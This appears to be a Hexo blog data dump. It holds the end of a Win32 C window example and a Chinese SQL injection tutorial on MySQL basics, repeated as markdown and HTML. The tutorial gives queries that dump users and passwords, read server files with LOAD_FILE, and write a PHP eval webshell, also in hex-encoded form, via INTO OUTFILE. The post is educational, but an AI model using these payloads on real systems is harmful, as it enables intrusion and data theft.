LoadCursor(<span class=\"literal\">NULL</span>, IDC_ARROW);                <span class=\"comment\">//光标</span></span><br><span class=\"line\">     wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);  <span class=\"comment\">//窗口背景色</span></span><br><span class=\"line\">     wndclass.lpszMenuName = <span class=\"literal\">NULL</span>;                                  <span class=\"comment\">//窗口菜单</span></span><br><span class=\"line\">     wndclass.lpszClassName = szAppName;     <span class=\"comment\">//注册的窗口类的字符串名称。（要求指针，因此是字符串的地址）</span></span><br><span class=\"line\"></span><br><span class=\"line\">     RegisterClass(&amp;wndclass);     <span class=\"comment\">//注册窗口类，类的信息定义在WNDCLASS结构中。传入结构的地址作为参数。</span></span><br><span class=\"line\"></span><br><span class=\"line\">     </span><br><span class=\"line\">     \\* ------------------------创建窗口---------------------------------*\\</span><br><span class=\"line\"></span><br><span class=\"line\">     HWND hwnd;     <span class=\"comment\">//声明一个句柄结构类型的变量。(通常声明于WinMain函数内部顶部，此处为了方便观看)</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">//根据窗口类创建窗口，并返回窗口的句柄。</span></span><br><span class=\"line\">     hwnd = CreateWindow( szAppName,                  <span class=\"comment\">//上一步中注册的类的名称（字符串地址）。</span></span><br><span class=\"line\">                         TEXT(<span class=\"string\">\"MyWindow\"</span>),           <span class=\"comment\">//窗口的标题（字符串地址）。</span></span><br><span class=\"line\">                         WS_OVERLAPPEDWINDOW,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">                         <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">                         hInstance,                  <span class=\"comment\">//程序当前实例的句柄，由WinMain函数传入。</span></span><br><span class=\"line\">                         <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">     \\* ------------------------显示、绘制窗口---------------------------------*/</span><br><span class=\"line\"></span><br><span class=\"line\">     ShowWindow(hwnd,iCmdShow);      <span class=\"comment\">//传入要显示的窗口的句柄。</span></span><br><span class=\"line\">     UpdateWindow(hwnd);             <span class=\"comment\">//传入要绘制的窗口句柄，实际上就是向窗口发送了一条 WM_PAINT 消息。</span></span><br><span class=\"line\"></span><br><span class=\"line\">     \\* ------------------------消息处理---------------------------------*/</span><br><span class=\"line\"></span><br><span class=\"line\">     MSG msg;        <span class=\"comment\">//一个MSG结构为类型，声明一个结构名为msg的结构。</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     <span class=\"keyword\">while</span>(GetMessage(&amp;msg,<span class=\"literal\">NULL</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>))    <span class=\"comment\">//传入的时msg结构的地址，因此三个函数操作的都是同一的对象。</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         TranslateMessage(&amp;msg);</span><br><span class=\"line\">         DispatchMessage(&amp;msg);          <span class=\"comment\">//将消息分发给回调函数WindowProc**</span></span><br><span class=\"line\"></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> msg.wParam;  <span class=\"comment\">//当接收到一个WM_QUIT消息时，程序就中止。并且返回传递给WM_QUIT消息的wParam参数的值。</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">LRESULT CALLBACK <span class=\"title\">WindowProc</span><span class=\"params\">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span>  <span class=\"comment\">//回调函数定义</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    HDC hdc;</span><br><span class=\"line\">    PAINTSTRUCT ps;</span><br><span class=\"line\">    RECT rect;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (message)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">       <span class=\"keyword\">case</span> WM_PAINT:</span><br><span class=\"line\">           hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class=\"line\">           GetClientRect(hwnd, &amp;rect);</span><br><span class=\"line\">           DrawText(hdc, TEXT(<span class=\"string\">\"Hello World!\"</span>), <span class=\"number\">-1</span>, &amp;rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class=\"line\">           EndPaint(hwnd, &amp;ps);</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">       <span class=\"keyword\">case</span> WM_DESTROY:</span><br><span class=\"line\">           PostQuitMessage(<span class=\"number\">0</span>);</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> DefWindowProc(hwnd, message, wParam, lParam); <span class=\"comment\">//若消息没有匹配到上面，默认执行该操作。</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"SQL注入系列Chapter 1：MySQL基础知识","date":"2019-03-12T02:14:38.000Z","_content":"\n## 一、MySQLi常用函数\n\n### 0x00 系统函数\n\n- **`@@version_compile_os`**：操作系统版本\n- **`@basedir`**：MySQL安装路径\n- **`version()`**：MySQL版本\n- **`user()`**：当前数据库用户\n- **`@@datadir`**：数据库路径\n- **`database()`**：当前所处数据库名\n\n<!-- more -->\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190312102557.png)\n\n### 0x01 字符串拼接函数\n\n- **`Concat()`**\n- **`Concat_WS()`**\n- **`GROUP_CONCAT()`**\n\n> 在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。\n\n**1.Concat(str1,str2,…)**\n\n返回结果为拼接参数得到的字符串。\n\n如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。\n\n![](0x00-SQL注入系列之Mysql基础知识\\01.png)\n\n- **`select concat(user,\",\",password) from mysql.user;`**\n\n![](0x00-SQL注入系列之Mysql基础知识\\02.png)\n\n**2.Concat_WS(separator,str1,str2,…)**\n\n`separator`为拼接字符串之间的分隔符。\n\n![](0x00-SQL注入系列之Mysql基础知识\\03.png)\n\n![](0x00-SQL注入系列之Mysql基础知识\\04.png)\n\n**3.GROUP_CONCAT()**\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190312110721.png)\n\n将DBMS中所有数据库名作为一列返回：\n\n- **`select group_concat(schema_name) from information_schema.schemata;`**\n\n将指定数据库的所有表名作为一列返回：\n\n- **`select group_concat(table_name) from information_schema.tables where table_schema='db_name';`**\n\n将指定数据表的所有列名作为一列返回：\n\n- **`select group_concat(column_name) from information_schema.columns where table_name='tb_name';`**\n\n### 0x02 字符/数字函数\n\n- **`ASCII()`**: 返回字符对应的ASCII码值。\n- **`ORD()`**：返回字符对应的ASCII码值。\n- **`CHAR()`**：返回数字对应的ASCII字符。\n\n![](0x00-SQL注入系列之Mysql基础知识\\05.png)\n\n- **`BIN()`**: 返回数字对应的二进制串。\n- **`CONV(Num,from_base,to_base)`**: 数字进制转换。\n\n![](0x00-SQL注入系列之Mysql基础知识\\06.png)\n\n- **`HEX()`**:十六进制编码\n- **`UNHEX()`**：十六进制解码\n\n![](0x00-SQL注入系列之Mysql基础知识\\07.png)\n\n- **`FLOOR()`**：向下取整\n- **`RAND()`**：用于产生一个0~1的随机数\n\n![](0x00-SQL注入系列之Mysql基础知识\\08.png)\n\n- **`LOWER()`**：转成小写字母\n- **`UPPER()`**: 转成大写字母\n\n### 0x03 字符串切片函数\n\n- **`MID(string，start，count)`**：从字符串下标为`start`处开始切取`count`个字符（下标从1开始）。\n- **`SUBSTR()`**：同上。\n- **`SUBSTRING()`**：同上。\n- **`LEFT(string, n)`**：获取从字符串左边开始的指定n个字符。\n\n![](0x00-SQL注入系列之Mysql基础知识\\09.png)\n\n### 0x04 盲注相关函数\n\n- **`sleep(n)`**：阻塞n秒。\n- **`len()`**：返回字符串的长度。\n- **`if(expr1,expr2,expr3)`**：如果expr1是TRUE ，则值为expr2; 否则为 expr3。\n\n### 0x05 读文件 Load_file()\n\n> 读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。\n\n**使用条件**：\n\n> 1. 连接数据库的用户有`file_priv`权限，启动`mysqld`用户必须拥有对此文件读取的权限。\n>\n>    > 查看用户的`file_priv`权限：`select User,File_priv from mysql.user;`\n>\n> 2. 欲读取文件必须在服务器上。\n>\n> 3. 必须指定文件的绝对路径。\n>\n> 4. 欲读取文件必须小于 max_allowed_packet。\n>\n>    > 查看允许最大包长度：`show global variables like \"max_allow%\";`\n>\n> 5. 如果`secure_file_priv`非NULL，则只能读取对应目录下的文件。当`secure_file_priv`的值为NULL ，表示限制`mysqld`不允许导入|导出。\n>\n>    > 查看允许读取的路径：`show  variables like \"secure_file%\";`\n\n**使用例子：**\n\n>  注意路径符号的处理，要么使用`/`，使用Windows的`\\`需要进行转义，即`\\\\`。\n>\n> 1. **`SELECT LOAD_FILE(\"C://TEST.txt\")`**\n>\n> 2. **`SELECT LOAD_FILE(\"C:/TEST.txt\")`**\n>\n> 3. **`SELECT LOAD_FILE(\"C:\\\\TEST.txt\")`**\n>\n> 4. **`SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))`**\n>\n>    > `CHAR(67,58,92,92,84,69,83,84,46,116,120,116)`得到的是`C:\\\\TEST.txt`。\n>\n> 5. **`SELECT LOAD_FILE(0x433a5c5c544553542e747874) `**\n>\n>    > `0x433a5c5c544553542e747874`是`C:\\\\TEST.txt`经过十六进制编码得到的。\n\n### 0x03 写（导入）文件\n\n**select ... into outfile ‘filepath’**\n\n**select ... into dumpfile ‘filepath’**\n\n> 可以把查询的行写入一个文件中。\n\n**使用条件**：\n\n> 1. 连接数据库的用户有`file_priv`权限，且启动`mysqld`的用户对目录需要有写权限。\n>\n> 2. 文件路径必须为绝对路径，`file_name`不能是一个已经存在的文件。\n>\n> 3. 如果`secure_file_priv`非NULL，则只能读取对应目录下的文件。当`secure_file_priv`的值为NULL ，表示限制`mysqld`不允许导入|导出。当`secure_file_priv`的值为空白，表示可以导入任意目录。\n>\n>    > `show  variables like \"secure_file%\";`\n\n**写入Webshell条件**：\n\n> 1. 需要知道网站的绝对物理路径，这样导出后的webshell可访问。\n> 2. 写入的目录有写权限。\n> 3. `secure_file_priv`非NULL且包含了WEB路径。\n\n**写入Webshell**：\n\n> - **`select \"<?php @eval($_POST[sh4douu])?>\"  into outfile \"X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php\";`**\n> - **`select \"<?php @eval($_POST[sh4douu])?>\"  into dumpfile \"X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php\";`**\n\n**LINES TERMINATED BY**\n\n用于不是`Union Select`时。\n\n> 1. 使用格式：\n>\n>    > **`Select version() into outfile 'X:/phpstudy/PHPTutorial/WWW/shell.php' LINES TERMINATED BY [十六进制数据]`**\n>\n> 2. 例子：\n>\n>    > **`Select user From mysql.user where user=\"root\" limit 1 into outfile 'X:/phpstudy/PHPTutorial/WWW/shell.php' LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;`**\n>    >\n>    > > 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的`<?php @eval($_POST[sh4douu])?>`，`Lines Terminated By`就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为`root`，之后的一句话木马是`Lines Terminated By`之后的十六进制数据解码得到的字符。\n>\n> 3. 此外还有`FIELDS TERMINATED BY`也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。\n\n\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190312143549.png)\n\n**dumpfile与outfile区别**：\n\n1. `outfile` 可以导出每行。`dumpfile` 只能导出一行（将目标文件写入同一行内；\n2. `outfile`不可导出二进制文件，文件会被破坏，转义等。`dumpfile`可导出完整可执行二进制文件。\n\n### 0x04 Union Select\n\n`UNION`操作符用于合并两个或多个`SELECT`语句的结果集。\n\n`UNION`只是将两个查询结果联结起来在一列显示，并不是联结两个表。\n\n`UNION ALL`和`UNION`不同之处在于`UNION ALL`会将所有符合条件的都列出来，既不去重复的值。而`UNION`去重。\n\n**使用条件**：\n\n>1. UNION 内部的 SELECT 语句必须拥有相同数量的列。\n>2. 列也必须拥有相似的数据类型。\n>3. 每条 SELECT 语句中的列的顺序必须相同。\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190318142002.png)\n\n**Order by**\n\n`ORDER BY`语句用于根据指定的列对结果集进行排序。\n\n在SQLi中，`order by`用于寻找查询的列数，因为根据前面我们知道`union select`使用条件之一是要列数相等。\n\n`order by`之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，`order by`允许接的最大数字就是实际查询的列数。\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190318142657.png)\n\n### 0x05 注释\n\n**行间注释：**\n\n- **`--+ `**（--之后一个空格）\n- **`#`**（浏览器访问时需要编码成%23，否则被当作锚点起始）\n- `；%00`(空字节)\n- *`*(反引号)\n\n**行内注释：**\n\n- **`/*注释*/`**\n- Mysql中，`/*! SQL 语句 */` 这种格式里面的 SQL 语句会当正常的语句一样被解析。\n\n","source":"_posts/0x00-SQL注入系列之Mysql基础知识.md","raw":"---\ntitle: SQL注入系列Chapter 1：MySQL基础知识\ndate: 2019-03-12 10:14:38\ntags: \n\t- SQL注入\n\t- MySQL\ncategories: WEB漏洞学习\n---\n\n## 一、MySQLi常用函数\n\n### 0x00 系统函数\n\n- **`@@version_compile_os`**：操作系统版本\n- **`@basedir`**：MySQL安装路径\n- **`version()`**：MySQL版本\n- **`user()`**：当前数据库用户\n- **`@@datadir`**：数据库路径\n- **`database()`**：当前所处数据库名\n\n<!-- more -->\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190312102557.png)\n\n### 0x01 字符串拼接函数\n\n- **`Concat()`**\n- **`Concat_WS()`**\n- **`GROUP_CONCAT()`**\n\n> 在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。\n\n**1.Concat(str1,str2,…)**\n\n返回结果为拼接参数得到的字符串。\n\n如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。\n\n![](0x00-SQL注入系列之Mysql基础知识\\01.png)\n\n- **`select concat(user,\",\",password) from mysql.user;`**\n\n![](0x00-SQL注入系列之Mysql基础知识\\02.png)\n\n**2.Concat_WS(separator,str1,str2,…)**\n\n`separator`为拼接字符串之间的分隔符。\n\n![](0x00-SQL注入系列之Mysql基础知识\\03.png)\n\n![](0x00-SQL注入系列之Mysql基础知识\\04.png)\n\n**3.GROUP_CONCAT()**\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190312110721.png)\n\n将DBMS中所有数据库名作为一列返回：\n\n- **`select group_concat(schema_name) from information_schema.schemata;`**\n\n将指定数据库的所有表名作为一列返回：\n\n- **`select group_concat(table_name) from information_schema.tables where table_schema='db_name';`**\n\n将指定数据表的所有列名作为一列返回：\n\n- **`select group_concat(column_name) from information_schema.columns where table_name='tb_name';`**\n\n### 0x02 字符/数字函数\n\n- **`ASCII()`**: 返回字符对应的ASCII码值。\n- **`ORD()`**：返回字符对应的ASCII码值。\n- **`CHAR()`**：返回数字对应的ASCII字符。\n\n![](0x00-SQL注入系列之Mysql基础知识\\05.png)\n\n- **`BIN()`**: 返回数字对应的二进制串。\n- **`CONV(Num,from_base,to_base)`**: 数字进制转换。\n\n![](0x00-SQL注入系列之Mysql基础知识\\06.png)\n\n- **`HEX()`**:十六进制编码\n- **`UNHEX()`**：十六进制解码\n\n![](0x00-SQL注入系列之Mysql基础知识\\07.png)\n\n- **`FLOOR()`**：向下取整\n- **`RAND()`**：用于产生一个0~1的随机数\n\n![](0x00-SQL注入系列之Mysql基础知识\\08.png)\n\n- **`LOWER()`**：转成小写字母\n- **`UPPER()`**: 转成大写字母\n\n### 0x03 字符串切片函数\n\n- **`MID(string，start，count)`**：从字符串下标为`start`处开始切取`count`个字符（下标从1开始）。\n- **`SUBSTR()`**：同上。\n- **`SUBSTRING()`**：同上。\n- **`LEFT(string, n)`**：获取从字符串左边开始的指定n个字符。\n\n![](0x00-SQL注入系列之Mysql基础知识\\09.png)\n\n### 0x04 盲注相关函数\n\n- **`sleep(n)`**：阻塞n秒。\n- **`len()`**：返回字符串的长度。\n- **`if(expr1,expr2,expr3)`**：如果expr1是TRUE ，则值为expr2; 否则为 expr3。\n\n### 0x05 读文件 Load_file()\n\n> 读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。\n\n**使用条件**：\n\n> 1. 连接数据库的用户有`file_priv`权限，启动`mysqld`用户必须拥有对此文件读取的权限。\n>\n>    > 查看用户的`file_priv`权限：`select User,File_priv from mysql.user;`\n>\n> 2. 欲读取文件必须在服务器上。\n>\n> 3. 必须指定文件的绝对路径。\n>\n> 4. 欲读取文件必须小于 max_allowed_packet。\n>\n>    > 查看允许最大包长度：`show global variables like \"max_allow%\";`\n>\n> 5. 如果`secure_file_priv`非NULL，则只能读取对应目录下的文件。当`secure_file_priv`的值为NULL ，表示限制`mysqld`不允许导入|导出。\n>\n>    > 查看允许读取的路径：`show  variables like \"secure_file%\";`\n\n**使用例子：**\n\n>  注意路径符号的处理，要么使用`/`，使用Windows的`\\`需要进行转义，即`\\\\`。\n>\n> 1. **`SELECT LOAD_FILE(\"C://TEST.txt\")`**\n>\n> 2. **`SELECT LOAD_FILE(\"C:/TEST.txt\")`**\n>\n> 3. **`SELECT LOAD_FILE(\"C:\\\\TEST.txt\")`**\n>\n> 4. **`SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))`**\n>\n>    > `CHAR(67,58,92,92,84,69,83,84,46,116,120,116)`得到的是`C:\\\\TEST.txt`。\n>\n> 5. **`SELECT LOAD_FILE(0x433a5c5c544553542e747874) `**\n>\n>    > `0x433a5c5c544553542e747874`是`C:\\\\TEST.txt`经过十六进制编码得到的。\n\n### 0x03 写（导入）文件\n\n**select ... into outfile ‘filepath’**\n\n**select ... into dumpfile ‘filepath’**\n\n> 可以把查询的行写入一个文件中。\n\n**使用条件**：\n\n> 1. 连接数据库的用户有`file_priv`权限，且启动`mysqld`的用户对目录需要有写权限。\n>\n> 2. 文件路径必须为绝对路径，`file_name`不能是一个已经存在的文件。\n>\n> 3. 如果`secure_file_priv`非NULL，则只能读取对应目录下的文件。当`secure_file_priv`的值为NULL ，表示限制`mysqld`不允许导入|导出。当`secure_file_priv`的值为空白，表示可以导入任意目录。\n>\n>    > `show  variables like \"secure_file%\";`\n\n**写入Webshell条件**：\n\n> 1. 需要知道网站的绝对物理路径，这样导出后的webshell可访问。\n> 2. 写入的目录有写权限。\n> 3. `secure_file_priv`非NULL且包含了WEB路径。\n\n**写入Webshell**：\n\n> - **`select \"<?php @eval($_POST[sh4douu])?>\"  into outfile \"X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php\";`**\n> - **`select \"<?php @eval($_POST[sh4douu])?>\"  into dumpfile \"X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php\";`**\n\n**LINES TERMINATED BY**\n\n用于不是`Union Select`时。\n\n> 1. 使用格式：\n>\n>    > **`Select version() into outfile 'X:/phpstudy/PHPTutorial/WWW/shell.php' LINES TERMINATED BY [十六进制数据]`**\n>\n> 2. 例子：\n>\n>    > **`Select user From mysql.user where user=\"root\" limit 1 into outfile 'X:/phpstudy/PHPTutorial/WWW/shell.php' LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;`**\n>    >\n>    > > 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的`<?php @eval($_POST[sh4douu])?>`，`Lines Terminated By`就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为`root`，之后的一句话木马是`Lines Terminated By`之后的十六进制数据解码得到的字符。\n>\n> 3. 此外还有`FIELDS TERMINATED BY`也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。\n\n\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190312143549.png)\n\n**dumpfile与outfile区别**：\n\n1. `outfile` 可以导出每行。`dumpfile` 只能导出一行（将目标文件写入同一行内；\n2. `outfile`不可导出二进制文件，文件会被破坏，转义等。`dumpfile`可导出完整可执行二进制文件。\n\n### 0x04 Union Select\n\n`UNION`操作符用于合并两个或多个`SELECT`语句的结果集。\n\n`UNION`只是将两个查询结果联结起来在一列显示，并不是联结两个表。\n\n`UNION ALL`和`UNION`不同之处在于`UNION ALL`会将所有符合条件的都列出来，既不去重复的值。而`UNION`去重。\n\n**使用条件**：\n\n>1. UNION 内部的 SELECT 语句必须拥有相同数量的列。\n>2. 列也必须拥有相似的数据类型。\n>3. 每条 SELECT 语句中的列的顺序必须相同。\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190318142002.png)\n\n**Order by**\n\n`ORDER BY`语句用于根据指定的列对结果集进行排序。\n\n在SQLi中，`order by`用于寻找查询的列数，因为根据前面我们知道`union select`使用条件之一是要列数相等。\n\n`order by`之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，`order by`允许接的最大数字就是实际查询的列数。\n\n![](0x00-SQL注入系列之Mysql基础知识\\QQ截图20190318142657.png)\n\n### 0x05 注释\n\n**行间注释：**\n\n- **`--+ `**（--之后一个空格）\n- **`#`**（浏览器访问时需要编码成%23，否则被当作锚点起始）\n- `；%00`(空字节)\n- *`*(反引号)\n\n**行内注释：**\n\n- **`/*注释*/`**\n- Mysql中，`/*! SQL 语句 */` 这种格式里面的 SQL 语句会当正常的语句一样被解析。\n\n","slug":"0x00-SQL注入系列之Mysql基础知识","published":1,"updated":"2019-03-19T08:00:00.908Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83n300607or0yx54w59f","content":"<h2 id=\"一、MySQLi常用函数\"><a href=\"#一、MySQLi常用函数\" class=\"headerlink\" title=\"一、MySQLi常用函数\"></a>一、MySQLi常用函数</h2><h3 id=\"0x00-系统函数\"><a href=\"#0x00-系统函数\" class=\"headerlink\" title=\"0x00 系统函数\"></a>0x00 系统函数</h3><ul>\n<li><strong><code>@@version_compile_os</code></strong>：操作系统版本</li>\n<li><strong><code>@basedir</code></strong>：MySQL安装路径</li>\n<li><strong><code>version()</code></strong>：MySQL版本</li>\n<li><strong><code>user()</code></strong>：当前数据库用户</li>\n<li><strong><code>@@datadir</code></strong>：数据库路径</li>\n<li><strong><code>database()</code></strong>：当前所处数据库名</li>\n</ul>\n<a id=\"more\"></a>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312102557.png\" alt></p>\n<h3 id=\"0x01-字符串拼接函数\"><a href=\"#0x01-字符串拼接函数\" class=\"headerlink\" title=\"0x01 字符串拼接函数\"></a>0x01 字符串拼接函数</h3><ul>\n<li><strong><code>Concat()</code></strong></li>\n<li><strong><code>Concat_WS()</code></strong></li>\n<li><strong><code>GROUP_CONCAT()</code></strong></li>\n</ul>\n<blockquote>\n<p>在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。</p>\n</blockquote>\n<p><strong>1.Concat(str1,str2,…)</strong></p>\n<p>返回结果为拼接参数得到的字符串。</p>\n<p>如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。</p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/01.png\" alt></p>\n<ul>\n<li><strong><code>select concat(user,&quot;,&quot;,password) from mysql.user;</code></strong></li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/02.png\" alt></p>\n<p><strong>2.Concat_WS(separator,str1,str2,…)</strong></p>\n<p><code>separator</code>为拼接字符串之间的分隔符。</p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/03.png\" alt></p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/04.png\" alt></p>\n<p><strong>3.GROUP_CONCAT()</strong></p>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312110721.png\" alt></p>\n<p>将DBMS中所有数据库名作为一列返回：</p>\n<ul>\n<li><strong><code>select group_concat(schema_name) from information_schema.schemata;</code></strong></li>\n</ul>\n<p>将指定数据库的所有表名作为一列返回：</p>\n<ul>\n<li><strong><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;db_name&#39;;</code></strong></li>\n</ul>\n<p>将指定数据表的所有列名作为一列返回：</p>\n<ul>\n<li><strong><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;tb_name&#39;;</code></strong></li>\n</ul>\n<h3 id=\"0x02-字符-数字函数\"><a href=\"#0x02-字符-数字函数\" class=\"headerlink\" title=\"0x02 字符/数字函数\"></a>0x02 字符/数字函数</h3><ul>\n<li><strong><code>ASCII()</code></strong>: 返回字符对应的ASCII码值。</li>\n<li><strong><code>ORD()</code></strong>：返回字符对应的ASCII码值。</li>\n<li><strong><code>CHAR()</code></strong>：返回数字对应的ASCII字符。</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/05.png\" alt></p>\n<ul>\n<li><strong><code>BIN()</code></strong>: 返回数字对应的二进制串。</li>\n<li><strong><code>CONV(Num,from_base,to_base)</code></strong>: 数字进制转换。</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/06.png\" alt></p>\n<ul>\n<li><strong><code>HEX()</code></strong>:十六进制编码</li>\n<li><strong><code>UNHEX()</code></strong>：十六进制解码</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/07.png\" alt></p>\n<ul>\n<li><strong><code>FLOOR()</code></strong>：向下取整</li>\n<li><strong><code>RAND()</code></strong>：用于产生一个0~1的随机数</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/08.png\" alt></p>\n<ul>\n<li><strong><code>LOWER()</code></strong>：转成小写字母</li>\n<li><strong><code>UPPER()</code></strong>: 转成大写字母</li>\n</ul>\n<h3 id=\"0x03-字符串切片函数\"><a href=\"#0x03-字符串切片函数\" class=\"headerlink\" title=\"0x03 字符串切片函数\"></a>0x03 字符串切片函数</h3><ul>\n<li><strong><code>MID(string，start，count)</code></strong>：从字符串下标为<code>start</code>处开始切取<code>count</code>个字符（下标从1开始）。</li>\n<li><strong><code>SUBSTR()</code></strong>：同上。</li>\n<li><strong><code>SUBSTRING()</code></strong>：同上。</li>\n<li><strong><code>LEFT(string, n)</code></strong>：获取从字符串左边开始的指定n个字符。</li>\n</ul>\n<p><img src=\"/2019/03/12/0x00-SQL注入系列之Mysql基础知识/09.png\" alt></p>\n<h3 id=\"0x04-盲注相关函数\"><a href=\"#0x04-盲注相关函数\" class=\"headerlink\" title=\"0x04 盲注相关函数\"></a>0x04 盲注相关函数</h3><ul>\n<li><strong><code>sleep(n)</code></strong>：阻塞n秒。</li>\n<li><strong><code>len()</code></strong>：返回字符串的长度。</li>\n<li><strong><code>if(expr1,expr2,expr3)</code></strong>：如果expr1是TRUE ，则值为expr2; 否则为 expr3。</li>\n</ul>\n<h3 id=\"0x05-读文件-Load-file\"><a href=\"#0x05-读文件-Load-file\" class=\"headerlink\" title=\"0x05 读文件 Load_file()\"></a>0x05 读文件 Load_file()</h3><blockquote>\n<p>读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。</p>\n</blockquote>\n<p><strong>使用条件</strong>：</p>\n<blockquote>\n<ol>\n<li><p>连接数据库的用户有<code>file_priv</code>权限，启动<code>mysqld</code>用户必须拥有对此文件读取的权限。</p>\n<blockquote>\n<p>查看用户的<code>file_priv</code>权限：<code>select User,File_priv from mysql.user;</code></p>\n</blockquote>\n</li>\n<li><p>欲读取文件必须在服务器上。</p>\n</li>\n<li><p>必须指定文件的绝对路径。</p>\n</li>\n<li><p>欲读取文件必须小于 max_allowed_packet。</p>\n<blockquote>\n<p>查看允许最大包长度：<code>show global variables like &quot;max_allow%&quot;;</code></p>\n</blockquote>\n</li>\n<li><p>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。</p>\n<blockquote>\n<p>查看允许读取的路径：<code>show  variables like &quot;secure_file%&quot;;</code></p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n<p><strong>使用例子：</strong></p>\n<blockquote>\n<p> 注意路径符号的处理，要么使用<code>/</code>，使用Windows的<code>\\</code>需要进行转义，即<code>\\\\</code>。</p>\n<ol>\n<li><p><strong><code>SELECT LOAD_FILE(&quot;C://TEST.txt&quot;)</code></strong></p>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;)</code></strong></p>\n</li>\n<li><p><strong><code>SELECT LOAD_FILE(&quot;C:\\\\TEST.txt&quot;)</code></strong></p>\n</li>\n<li><p><strong><code>SELECT 